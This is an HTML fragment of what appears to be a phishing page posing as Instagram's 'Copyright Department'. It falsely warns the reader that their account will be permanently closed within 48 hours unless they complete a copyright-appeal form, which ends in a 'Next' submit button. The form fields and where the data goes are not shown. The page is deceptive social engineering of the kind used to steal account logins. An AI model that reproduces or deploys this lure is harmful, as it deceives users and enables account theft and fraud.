...
<img src="cwo/sup.gif" width="150"><br>
		...
		width:79%;
		margin-top:10px;
		display:block;">Copyright Department </p>
		<p style="	font-family:sans-serif;
		font-size:16px;
		word-spacing:1px;
		font-weight:400;
		...
		width:79%;
		margin-top:10px;
		display:block;">If your account has received a notification that Instagram is infringing copyright, please complete this form when a copyright infringement is detected on a post on your account.<br><br> 
		If you believe that copyright infringement is false, you must provide feedback. If you do not give feedback, your account will be permanently closed by Instagram within 48 hours.<br><br>
...
<br>
		<button type="submit" class="next">Next
</button>
</form>
</div>
<br>
